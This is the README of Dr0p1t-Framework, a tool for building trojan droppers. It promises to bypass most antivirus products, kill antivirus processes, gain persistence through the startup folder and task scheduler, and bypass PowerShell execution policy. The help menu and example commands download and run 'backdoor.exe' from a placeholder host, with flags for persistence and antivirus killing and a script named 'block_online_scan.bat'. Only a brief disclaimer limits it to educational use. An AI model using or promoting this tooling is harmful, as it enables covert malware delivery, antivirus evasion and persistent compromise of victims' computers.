# Dr0p1t-Framework ![Stage](https://img.shields.io/badge/Release-STABLE-brightgreen.svg) [![Python 3.5](https://img.shields.io/badge/Python-3.5-yellow.svg)](http://www.python.org/download/) [![Python 2.7](https://img.shields.io/badge/Python-2.7-yellow.svg)](http://www.python.org/download/) ![Build Status](https://img.shields.io/badge/Version-1.1-red.svg)
###### Version 1.1 , see CHANGELOG.md file

Have you ever heard about trojan droppers ? you can read about them from [here](https://blog.malwarebytes.com/threats/trojan-dropper/).

Dr0p1t let you create a dropper that bypass most AVs, some sandboxes and have some tricks ;)

# Features
- Works with Windows and Linux
- Adding malware after downloading it to startup
- Adding malware after downloading it to task scheduler
- Finding and killing the antivirus before running the malware
- Running a custom (batch|powershell|vbs) file you have choosen before running the malware
- In running powershell scripts it can bypass execution policy
- Using UPX to compress the dropper after creating it
- Choose an icon for the dropper after creating it

# Screenshots ( Not always updated )
## On Windows
<img src="https://github.com/D4Vinci/Dr0p1t-Framework/blob/master/Screenshots/Windows/Random2.JPG" width="55%"></img>

<img src="https://github.com/D4Vinci/Dr0p1t-Framework/blob/master/Screenshots/Windows/Random1.JPG" width="40%"></img>
<img src="https://github.com/D4Vinci/Dr0p1t-Framework/raw/master/Screenshots/Windows/Help_msg.JPG" width="35%"></img>
## On Linux (Backbox)
<img src="https://github.com/D4Vinci/Dr0p1t-Framework/blob/master/Screenshots/Linux/Random1.JPG" width="55%"></img>

<img src="https://github.com/D4Vinci/Dr0p1t-Framework/blob/master/Screenshots/Linux/Random2.JPG" width="40%"></img>
<img src="https://github.com/D4Vinci/Dr0p1t-Framework/blob/master/Screenshots/Linux/Help_msg.JPG" width="35%"></img>

### Help menu
```
Usage: Dr0p1t.py Malware_Url [Options]

options:
  -h, --help   show this help message and exit
  -s           Add your malware to startup (Persistence)
  -t           Add your malware to task scheduler (Persistence)
  -k           Kill antivirus process before running your malware.
  -b           Run this batch script before running your malware. Check scripts folder
  -p           Run this powershell script before running your malware. Check scripts folder
  -v           Run this vbs script before running your malware. Check scripts folder
  --only32     Download your malware for 32 bit devices only
  --only64     Download your malware for 64 bit devices only
  --upx        Use UPX to compress the final file.
  --nocompile  Tell the framework to not compile the final file.
  -i           Use icon to the final file. Check icons folder.
  -q           Stay quite ( no banner )
  -u           Check for updates
  -nd          Display less output information
```
### Examples
```
./Dr0p1t.py https://test.com/backdoor.exe -s -t -k --upx
./Dr0p1t.py https://test.com/backdoor.exe -k -b block_online_scan.bat --only32
./Dr0p1t.py https://test.com/backdoor.exe -s -t -k -p Enable_PSRemoting.ps1
```
# Prerequisites
- Python 3.x or 2.7 ( prefered 3.5 and don't use 3.6 because it's not supported yet by PyInstaller )
- Python libraries requirements in requirements.txt

# Installation
if you are on linux and do
```
git clone https://github.com/D4Vinci/Dr0p1t-Framework
chmod 777 -R Dr0p1t-Framework
cd Dr0p1t-Framework
pip install -r requirements.txt
./Dr0p1t.py
```
And if you are on windows download it and then do
```
cd Dr0p1t-Framework
pip install -r requirements.txt
pip install -r windows_requirements.txt
./Dr0p1t.py
```
Libraries in windows_requirements.txt are used to enable unicodes in windows which will make coloring possible :smile:

## Todo

[Check out this link](https://github.com/D4Vinci/Dr0p1t-Framework/projects/1)

## Contact
- [Twitter](https://twitter.com/D4Vinci1)
- [Facebook](https://www.facebook.com/kareem.shoair)

## Disclaimer
Dr0p1t Framework not responsible for misuse and for illegal purposes. Use it only for work or educational purpose !!!

Copying a code from this framework or using it in another tool is accepted as you mention where you get it from :smile:

> Pull requests are always welcomed :D

# Much more features to come, stay tuned !!
